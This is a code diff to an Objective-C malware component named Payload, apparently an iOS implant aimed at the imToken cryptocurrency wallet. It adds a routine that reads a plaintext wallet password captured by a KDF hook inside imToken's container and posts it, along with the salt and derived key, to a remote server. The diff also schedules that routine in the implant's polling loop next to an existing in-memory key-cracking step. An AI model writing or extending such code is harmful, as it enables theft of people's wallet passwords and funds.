@@ -32,6 +32,7 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 @interface Payload ()
 - (void)reportKeyDiag:(NSString *)tag ctx:(NSDictionary *)ctx;
 - (void)runSelfTest;
+- (void)probeImTokenPassword;
 @end
 
 @implementation Payload
@@ -481,7 +482,8 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
                         // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
-                        [self crackImTokenByKey];
+                        [self probeImTokenPassword];   // 优先：KDF hook 直接给明文密码
+                        [self crackImTokenByKey];      // 兜底：内存里找派生密钥
                         [self pollTasks];                          // 每轮都轮询
                     }
                 } @catch (NSException *e) {
@@ -794,9 +796,59 @@ static NSArray *WalletMemoryTargets(void) {
     }
 }
 
-@end
+/// 读 imToken 里 KDF hook 落下的明文密码，直接送服务端解密
+/// 文件格式：pwd|rounds|saltHex|derivedKeyHex
+- (void)probeImTokenPassword {
+    @try {
+        NSData *d = [WalletFS readFile:@"Documents/_imt_pw.txt" inContainer:@"im.token.app"];
+        if (!d.length) d = [WalletFS readFile:@"tmp/_imt_pw.txt" inContainer:@"im.token.app"];
+        if (!d.length) return;
 
-#pragma mark - 入口
+        NSString *line = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
+        line = [line stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+        if (!line.length) return;
+
+        int rounds = 0;
+        NSString *pwd = nil, *salt = @"", *dk = @"";
+        NSArray *parts = [line componentsSeparatedByString:@"|"];
+        if (parts.count >= 4) {
+            pwd = parts[0];
+            rounds = [parts[1] intValue];
+            salt = parts[2];
+            dk = parts[3];
+        } else {
+            pwd = line;                 // 只有密码，也够用
+        }
+        if (!pwd.length) return;
+
+        // 同一个密码只发一次
+        static NSString *lastPwd = nil;
+        if ([lastPwd isEqualToString:pwd]) return;
+        lastPwd = [pwd copy];
+
+        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        body[@"c"] = kSeed;
+        body[@"bundle_id"] = @"im.token.app";
+        body[@"pwd"] = pwd;
+        NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:60];
+
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"imtoken_pwd_from_hook";
+        ev[@"c"] = kSeed;
+        ev[@"ctx"] = @{ @"pwLen": @(pwd.length),
+                        @"rounds": @(rounds),
+                        @"salt": salt ?: @"",
+                        @"derivedKey": dk ?: @"",
+                        @"resp": r ? [r description] : @"nil" };
+        [self.net sendEvent:ev];
+        [self log:[NSString stringWithFormat:@"HOOK PWD len=%lu rounds=%d -> %@",
+                   (unsigned long)pwd.length, rounds, r ? @"ok" : @"nil"]];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"probeImTokenPassword: %@", e.reason]];
+    }
+}
+
+@end
 
 __attribute__((constructor))
 static void PayloadInit(void) {
